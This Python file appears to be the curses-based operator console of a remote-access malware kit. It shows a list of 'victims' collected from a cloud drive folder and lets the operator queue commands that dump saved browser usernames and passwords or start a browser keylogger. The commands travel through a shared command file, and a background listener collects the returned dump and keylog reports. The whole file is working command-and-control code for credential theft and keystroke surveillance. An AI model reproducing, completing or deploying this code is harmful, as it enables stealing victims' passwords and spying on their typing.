#%%
import random
import json
from clint.network import net_time
from threading import Thread
import atexit
from server.util import data_store
from server.util import force_stop

from server.drive import (drive_file, source_drive, vic_path, move_file, init_vic)
import server.drive as _d
import atexit
import string
from threading import Thread
from time import sleep
from functools import lru_cache
from math import ceil
import curses
import sys
from os.path import join
from curses import textpad
from collections import OrderedDict
from collections.abc import Iterable
from logger import add_curses_handler, log
from rpyc import connect

# from iamlaizy import reload_me
# reload_me()


#%%
def init_console():
    window = curses.initscr()
    curses.noecho()
    curses.cbreak()
    window.keypad(1)
    curses.curs_set(0)
    try:
        curses.start_color()
    except:
        pass
    
    return window
window=init_console()

def reset_console():
    window.keypad(0)
    curses.echo()
    curses.nocbreak()
    curses.curs_set(1)
    curses.endwin()
atexit.register(reset_console)

curses.init_pair(1, curses.COLOR_BLACK, curses.COLOR_WHITE)
curses.init_pair(2, curses.COLOR_GREEN, curses.COLOR_BLACK)

def maxyx(win):
    '''printable max y,x'''
    y, x=win.getmaxyx()
    return y-1, x-2

def textbox(win):
    #degugging
    textpad.rectangle(win, 0, 0, *maxyx(win))

def newwin(y1, x1, y2, x2):
    return curses.newwin(y2-y1, x2-x1, y1, x1)

def middle_print_lst(window, lst, step)->list:
    y, weight = window.getmaxyx()
    assert y>len(lst)*step-1, "currently mlutipage string view not supported."
    y//=2
    y-=(len(lst)*step)//2
    
    cache=[]
    for opt in lst:
        x=weight//2-len(opt)//2
        window.addstr(y, x, opt)
        
        cache.append([y, x, opt])
        y+=step

    return cache

def middle_print_str(window:curses.window, string):
    y, x = maxyx(window)
    assert len(string)<x*y, "currently mlutipage string view not supported."
    
    line=x-1# lenngth of a single line
    lines=ceil(len(string)/line)

    y//=2
    y-=lines//2# line is not 0 indexing
    
    for start in range(0, len(string), line):
        sub_str=string[start:start+line]
        x=line//2-len(sub_str)//2+1# one for the border line
        window.addstr(y, x, sub_str)
        
        y+=1

def user_input(win):
    curses.echo()
    curses.curs_set(1)
    
    win.refresh()
    _input = win.getstr()
    
    curses.noecho()
    curses.curs_set(0)
    return _input.decode()


noti_lc=1# notification bar line_count
status_lc=2# status bar line_count
y, x=maxyx(window)

win=OrderedDict({
    'y1':status_lc,
    'x1':0,
    'y2':y-noti_lc,
    'x2':x,
})
status_bar=newwin(0, win["x1"], win["y1"], win["x2"])
window=newwin(*win.values())
notifi=newwin(win["y2"], win["x1"], y, win["x2"])
del noti_lc, status_lc
add_curses_handler(notifi)


def clear():
    "re build to clear the screen before any new page"
    global window
    window=newwin(*win.values())
    window.keypad(1)
    window.clear()
    window.refresh()


init_vic()
if _d.secure_mod and not _d.vic:
    log.error('No previous cached user list found.')


class Home:
    circle = "●"
    up_but='▲'
    down_but="▼"
    black_block='█'
    
    def __init__(self):
        self.page:int = 0# 0 indexing
        self.step=2# row
        self.total_page:int = 1
        self.single_page=0
        self.key_map={
            curses.KEY_RESIZE: self.print_page,
            curses.ascii.ESC: sys.exit,
            
            ord('s'):self.secure,
            ord('S'):self.secure,
            ord("r"):self.refresh,
            ord("R"):self.refresh,
            
            ord("\n"):self.enter,
            curses.KEY_ENTER:self.enter,

            451: self.page_up,
            curses.KEY_PPAGE: self.page_up,
            457: self.page_down,
            curses.KEY_NPAGE: self.page_down,
            
            450: self.up,
            452: self.left,
            454: self.right,
            456: self.down,
            curses.KEY_UP: self.up,
            curses.KEY_DOWN: self.left,
            curses.KEY_RIGHT: self.right,
            curses.KEY_DOWN: self.down,
        }
        self.selected=[1, 1]# [column, row] # 1+(n-1)*2
        self.selection={}# caching
        # self.selection={
        #     self.page:{
        #         self.selected:[y, x, name]
        #     }
        # }# caching        

    def show(self):# main function
        window.keypad(1)
        self.resize()

        while 1:
            key=window.getch()
            self.key_map.get(int(key), lambda :None)()

    def print_name_box(self):
        column=1
        pos=1
        for name in _d.vic[self.start:self.stop+1]:
            
            if pos>=self.boxh:
                if column==self.columns:
                    break
                column+=1
                pos=1
            
            name=self.circle+" "+name
            y=self.box["y1"]+pos
            x=self.box["x1"]+column+self.maxln*(column-1)
            x+=self.pad*(column-1)

            window.addstr(y, x, name)
            
            pos+=self.step
        
        self.endpoint = [column, pos-self.step]
        if _d.vic:
            self.color()

    def scroll_bar(self):
        scroll=self.box.copy()
        scroll["x1"]=self.box["x2"]
        scroll["x2"]=self.box["x2"]+2
        textpad.rectangle(window, *scroll.values())
        scroll["x1"]+=1
        scroll["x2"]-=1

        window.addstr(scroll["y1"], scroll["x1"], self.up_but)
        scroll["y1"]+=1
        window.addstr(scroll["y2"], scroll["x2"], self.down_but)
        # scroll["y2"]-=1

        scrollh = (scroll["y2"]-scroll["y1"])
        barln=scrollh//self.total_page
        y=scroll["y1"]+(self.page*barln)
        if self.total_page!=1:
            barln+=scrollh%2
            barln+=self.total_page%2
        
        self.print_varticuler(y, scroll["x1"], self.black_block*barln)

    def print_varticuler(self, y, x, text):
        for i in text:
            window.addstr(y, x, i)
            y+=1

    def calculate(self):
        sh, sw = maxyx(window)
        self.box=OrderedDict([["y1", 0], ["x1", 0], ["y2", sh], ["x2", sw-3]])# extra 3 for scroll bar
        self.boxh = self.box["y2"]-self.box["y1"]
        boxw = self.box["x2"]-self.box["x1"]

    
        self.rows=ceil((self.boxh-1)/self.step) # excluding border line and one one name in two row
        
        if not _d.vic:
            return
        # on change of _d.vic list
        self.maxln=len(max(_d.vic, key=lambda x:len(x)))+3# 2 spaces and 1 circle
        self.columns = (boxw-1)//self.maxln # excluding border line
        self.pad=(boxw-(self.columns*self.maxln))//self.columns # plus or *
        self.single_page=self.rows*self.columns
        self.total_page=ceil(len(_d.vic)/self.single_page) # 0 indexed for scroll bar
        
    def resize(self):
        log.info('resturcting the whole home page')
        self.print_status()        

        self.calculate()
        self.print_page()
        
    def print_page(self):
        ''' self.calculate must be run before '''
        self.start=self.page*self.single_page
        self.stop=self.start+self.single_page-1
        
        clear()
        textpad.rectangle(window, *self.box.values())
        
        self.scroll_bar()
        # window.noutrefresh()
        self.print_name_box()
        # window.noutrefresh()
        
        window.refresh()

    def page_down(self):
        if self.total_page!=self.page+1:# self.page 0 index
            self.page=self.page+1
            self.print_page()

    def page_up(self):
        if self.page!=0:
            self.page=self.page-1
            self.print_page()

    def enter(self):
        self.print_status(0)
        action(self.selected_name)
        self.resize()


    def up(self):
        if self.selected[1]==1:
            # self.page_up()
            return
        self.color_back()
        self.selected[1]-=self.step
        self.color()

    def down(self):
        # if self.selected[1]+self.step>=self.boxh:
        if self.selected==self.endpoint or self.selected[1]+self.step>=self.boxh:
            # self.page_down()
            return
        self.color_back()
        self.selected[1]+=self.step
        self.color()

    def left(self):
        if self.selected[0]==1:
            # self.selected=[self.column, self.row] if self.page!=0 else self.selected
            # self.page_up()
            return
        self.color_back()
        self.selected[0]-=1
        self.color()

    def right(self):
        if self.selected[0]==self.endpoint[0] or (
            self.selected[0]+1==self.endpoint[0] and self.selected[1]>self.endpoint[1]
        ):
            # self.selected=[self.column, self.row] if self.page!=self.total_page-1 else self.selected
            # self.page_down()
            return
        
        self.color_back()
        self.selected[0]+=1
        self.color()

    @property
    def selected_name(self):
        '''1 indexed c: column and r: row'''
        pos=self.start+(self.rows*(self.selected[0]-1))+(self.selected[1]-1)//2
        # pos=len(_d.vic)-1 if pos>=len(_d.vic) else pos
        name=_d.vic[pos]
        return name

    def _color(self):
        "self.selected column is not 0 indexed"
        try:
            return self.selection[self.page][tuple(self.selected)]
        except KeyError:
            pass

        name=self.selected_name
        name=self.circle+" "+name

        y=self.selected[1]+self.box["y1"]
        x=self.box['x1']+(self.selected[0]-1)*self.maxln+self.selected[0]
        x+=self.pad*(self.selected[0]-1)

        self.selection[self.page]={
            tuple(self.selected):[]
        }
        self.selection[self.page][tuple(self.selected)]=[y, x, name]
        return y, x, name

    def color(self):
        window.attron(curses.color_pair(1))
        window.addstr(*self._color())
        window.attroff(curses.color_pair(1))
        # curses.doupdate()
        window.refresh()

    def color_back(self):
        window.addstr(*self._color())
        # window.noutrefresh()


    def print_status(self, full=1):
        status_bar.clear()

        status=[
            f'token_provider is {_d.secure_mod and "off" or "on"}',
        ]
        if full:
            _s="press 's' to turn (on-off) token_provider"
            if token_provider.running:
                _s+=" and 'r' to refresh vic list"
            
            status.append(_s)

        
        middle_print_lst(status_bar, status, 1)
        status_bar.refresh()

    def refresh(self):
        if _d.secure_mod:
            return

        lst = source_drive.list_folder(vic_path)
        log.info(f'got {len(lst)} new victims.')
        if not lst:
            return

        _d.vic.extend(lst)
        self.resize()
        log.info("home page restructured.")
        
        # func move_folders
        for i in source_drive.list_folder(vic_path):
            move_file(join(vic_path, i))
    
    def secure(self):
        if _d.secure_mod:
            token_provider.start()
        else:
            token_provider.stop()

        self.print_status()

    def test(self):
        while 1:
            key=window.getch()
            window.addstr(0, 0, str(key))
            window.refresh()
home_page=Home()

listen_for=[]
def listener():
    while 1:
        for i in listen_for:
            if source_drive.exists(i):
                log.info(f'file listener found a file. "{i}"')
                move_file(i)
            else:
                sleep(2)
        sleep(10)
    
class Tokener:
    expiry = data_store.var.safety_interval

    def __init__(self):
        self.core = Thread(target=self.update_token, daemon=True, name='tokener')
        self.listen = Thread(target=listener, daemon=True, name="file listener")

    @property
    def running(self):
        return self.core.is_alive()
    
    def start(self):
        if self.running:
            if _d.secure_mod:
                log.info('Token provider scheduled. Please be patient')
            return
        self.core.start()
        log.info('token provider started.')

    def stop(self):
        if not self.running:
            return

        log.info('stoping token rovider')
        with drive_file(data_store.var.token_file) as f:
            f.rewrite("")
        force_stop(self.core)
        force_stop(self.listen)
        
        _d.secure_mod=True
        self.__init__()
        log.info('token provider stoped.')


    def get_token(self):
        log.debug('waiting for tokens. wait a few moment')
        left_size=self.tokens.left_size
        while left_size:
            if left_size>1:# 
                log.info(f"{left_size} tokens need more to establish a secure token")
                sleep(self.tokens.interval-5)
            sleep(5)# wait for the bucket tobe ready
            left_size=self.tokens.left_size

        token=self.tokens.get()
        log.debug('token received from the bucket')
        if _d.secure_mod:
            self.listen.start()
            _d.secure_mod=False
        
        return dict(token)# netrif.type --> local dict

    def update_token(self):
        log.debug('trying to connect with the bucket')
        try:
            conn=connect('localhost', data_store.var.bucket_port)
        except ConnectionRefusedError:
            log.error('token provider can\'t start because bucket is not running.')
            return
        self.tokens=conn.root
        
        while 1:
            with drive_file(data_store.var.token_file) as f:
                log.info('token provider seeking for token.')
                token=self.get_token()
                f.rewrite(token)
                
            log.info('updated previous token.')
            sleep(token['expiry']-net_time()-20)# wait for the bucket to be full again

token_provider = Tokener()
atexit.register(token_provider.stop)


class Option_view:
    def __init__(self, opt_lst, opt_win=window):
        self.opt_lst=opt_lst
        self.opt_win=opt_win

        self.step=2
        self.cursor=0
        self.key_map={
            450: self.up,
            456: self.down,
            curses.KEY_UP: self.up,
            curses.KEY_DOWN: self.down,
            
            10: self.enter,
            curses.KEY_ENTER: self.enter
        }
        
        self.position=[]

    def show(self):
        self.opt_win.clear()
        self.opt_win.keypad(True)
        self.print_opt()
        
        while 1:
            key=self.opt_win.getch()
            if key==curses.ascii.ESC:
                self.exit()
                return

            self.key_map.get(int(key), lambda :None)()

    def color_back(self):
        self.opt_win.addstr(*self.position[self.cursor])
    
    def color(self, pair=1):
        y, x, opt=self.position[self.cursor]
        
        self.opt_win.attron(curses.color_pair(pair))
        self.opt_win.addstr(y, x, opt)
        self.opt_win.attroff(curses.color_pair(pair))

        self.on_selection(opt)

    def on_selection(self, opt):
        pass

    def print_opt(self):
        textbox(self.opt_win)
        
        self.position=middle_print_lst(self.opt_win, self.opt_lst, self.step)
        self.color()

        self.opt_win.refresh()
        self.opt_win.getch()

    def up(self):
        if self.cursor!=0:
            self.color_back()
            self.cursor-=1
            self.color()
    
    def down(self):
        if self.cursor!=len(self.opt_lst)-1:
            self.color_back()
            self.cursor+=1
            self.color()

    def enter(self):
        key=list(self.opt_lst.keys())[self.cursor]
        self.opt_lst[key][0]()
        self.show()

    def exit(self):
        pass


all_command=OrderedDict(
    {
        "dump": [None, 'Dump saved user names and password from browsers. [reports: dump_(time).json]'],
        "stored_value": [None, 'check all the key-value stored in data_store. [reports: data_store_(time).json]'],
        "set_value": [None, "change a value of stored key in data_store."],
        "start_logger": [None, 'start a browser spacefic key logger.[reports: key_dump_(time).log]']
    }
)

class Multi_opt(Option_view):
    def __init__(self, opt_lst, opt_win=window):
        self.selected=[]
        opt_lst=list(opt_lst)
        opt_lst.append("enter")
        super().__init__(opt_lst, opt_win)

    def show(self):
        self.opt_win.keypad(True)
        self.print_opt()
        
        while 1:
            key=self.opt_win.getch()
            key=self.opt_win.getch()
            if key==curses.ascii.ESC:
                self.exit()
                return
            
            ret=self.key_map.get(int(key), lambda :None)()
            if ret:
                return ret

    def color_back(self, force=False):
        key=self.opt_lst[self.cursor]
        if force or (key not in self.selected):
            super().color_back()
        else:
            self.color(2)

    def enter(self):
        if self.cursor==len(self.opt_lst)-1:
            return self.selected
        
        key=self.opt_lst[self.cursor]
        if key in self.selected:
            self.color_back(True)
            self.selected.remove(key)
        else:
            self.color(2)
            self.selected.append(key)

class Single_opt(Option_view):
    def __init__(self, opt_lst, opt_win=window):
        opt_lst=list(opt_lst)
        super().__init__(opt_lst, opt_win)
    
    def show(self):
        self.opt_win.clear()
        self.opt_win.keypad(True)
        self.print_opt()
        
        while 1:
            key=self.opt_win.getch()
            if key==curses.ascii.ESC:
                self.exit()
                return
            
            ret=self.key_map.get(int(key), lambda :None)()
            if ret:
                return ret

    def enter(self):
        return self.opt_lst[self.cursor]

# action page
class action:
    def __init__(self, vic_name):
        log.info(f'showing action page for {vic_name}')

        self.vic_name = vic_name
        self.last_time=0# fix it later on
        self.commands={}# also this one # previous command that is not responsed

        clear()
        sh, sw = window.getmaxyx()
        opt_box = OrderedDict({
            "y1":win['y1'],
            "x1":win['x1'],
            "y2":sh,
            "x2":sw//3
        })
        opt_win=newwin(*opt_box.values())

        des_box=opt_box
        des_box['x1']=des_box['x2']
        des_box['x2']=win['x2']

        self.des_win=newwin(*des_box.values())
        
        del opt_box, des_box

        all_command=OrderedDict(
            {
                "dump": [self.dump, 'Dump saved user names and password from browsers. [reports: dump_(time).json]'],
                "stored_value": [self.stored_value, 'check all the key-value stored in data_store. [reports: data_store_(time).json]', ],
                "set_value": [self.set_value, "change a value of stored key in data_store.", ],
                "start_logger": [self.start_logger, 'start a browser spacefic key logger.[reports: key_dump.log]', ]
            }
        )
        opt_viewer=Option_view(all_command, opt_win)
        opt_viewer.on_selection=self.print_des
        opt_viewer.exit=self.commit
        opt_viewer.show()

    def print_des(self, opt):
        self.des_win.clear()
        middle_print_str(self.des_win, all_command[opt][1])
        self.des_win.refresh()


    def dump(self):
        command={
            "func":"dump"
        }
        sec=self.stage(command)
        self.add_to_listen(f'dump_{sec}.json')

    def stored_value(self):
        command={
            "func":"start_logger"
        }
        sec = self.stage(command)
        self.add_to_listen(f'data_store_{sec}.json')

    def set_value(self):
        from clint.util import Values

        data=Values().__dict__
        kv={}
        
        key=Single_opt(data.keys(), window).show()
        if not key:
            clear()
            return
        
        clear()
        t=data[key]
        if isinstance(t, Iterable):
            middle_print_str(window, f"enter comma seperated values for {key} accept-type {type(t)}: ")
            p=user_input(window)
            if p:
                kv[key]=p.split(", ") 
        elif isinstance(t, bool):
            p=Single_opt(["True", "False"]).show()
            if not p:
                return

            if p:
                kv[key]={
                    "True":True,
                    "False":False
                }.get(p)
        else:# int, str
            middle_print_str(window, f"enter value for {key} accept-type {type(t)}: ")
            p=user_input(window)
            if p:
                kv[key]=p

        command={
            "func":"set_value",
            "kwargs":kv
        }
        sec = self.stage(command)
        clear()

    def start_logger(self):
        from clint.keylogger import browsers
        
        selected=Multi_opt(browsers, window).show()
        if not selected:
            return
        
        selected = selected or browsers
        
        clear()
        middle_print_str(window, "set max size of Key log (default:3) in MB :")
        size=user_input(window) or 3

        command={
            "func": "start_logger",
            "kwargs":{
                "targets":selected,
                "max_size":size
            }
        }
        sec = self.stage(command)
        self.add_to_listen(f'key_dump_{sec}.log')
        clear()


    def add_to_listen(self, name:str):
        path=join("report", self.vic_name)
        
        # name, _, ext=name.rpartition(".")
        # path = join(path, f"{name}_{self.last_time}.{ext}")
        path=join(path, name)
        listen_for.append(path)

    def stage(self, command):
        log.info(f"starting {command['func']} function")
        log.debug(f"staged full command: {command}")

        self.last_time+=1
        command["time"]=self.last_time,
        if self.commands.get(self.vic_name):
            self.commands[self.vic_name].append(command)
        else:
            self.commands[self.vic_name]=[command]
        return self.last_time
    
    def commit(self):
        log.info("puhing all the staged commands.")
        if not self.commands:
            return
        with drive_file(data_store.var.command_file) as f:
            pre_com:dict=json.loads(f.read())
            self.commands.update(pre_com)
            f.rewrite(self.commands)




if __name__=="__main__":
    vic = ["".join(random.choices(string.ascii_lowercase, k=20)) for i in range(8)]
    # action(0)
    Home().show()
    # Home().test()

    

    # middle_print_str(window, "enter numbers: ")
    # p=user_input()
    # print(p)
    

    # print_in_middle(window, all_command, 2)
    # window.refresh()
    # sleep(3)
    # window.getch()
